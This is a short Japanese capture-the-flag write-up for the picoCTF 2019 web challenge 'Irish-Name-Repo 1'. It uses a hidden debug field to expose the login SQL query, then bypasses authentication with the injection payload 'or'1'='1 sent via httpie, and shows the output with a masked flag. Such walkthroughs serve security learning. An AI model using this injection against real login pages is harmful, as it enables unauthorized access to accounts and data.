# picoCTF 2019 web 300 Irish-Name-Repo 1

## Solution

問題ページが与えられる

<https://2019shell1.picoctf.com/problem/12273/>

左上のハンバーガーメニューから「Admin Login」ページへ飛ぶ

<https://2019shell1.picoctf.com/problem/12273/login.html>

ソースを見ると

```html
<form action="login.php" method="POST">
    <fieldset>
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" class="form-control">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <div class="controls">
                <input type="password" id="password" name="password" class="form-control">
            </div>
        </div>
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```

username, password, debug が login.php へ POST されている。

debug を 1 にしてパスワードを送ってみる

```
http -f https://2019shell1.picoctf.com/problem/12273/login.php username=a password=b debug=1
```

```html
<pre>
username: a
password: b
SQL query: SELECT * FROM users WHERE name='a' AND password='b'
</pre>
<h1>Login failed.</h1>
```

この SQL 文だと「'or'1'='1」で true になる

```
http -f https://2019shell1.picoctf.com/problem/12273/login.php username=a password="'or'1'='1" debug=1
```

```html
<pre>
username: a
password: 'or'1'='1
SQL query: SELECT * FROM users WHERE name='a' AND password=''or'1'='1'
</pre>
<h1>Logged in!</h1>
<p>Your flag is: picoCTF{XXXXXXXXXXXXXXXXXXXXXX}</p>
```
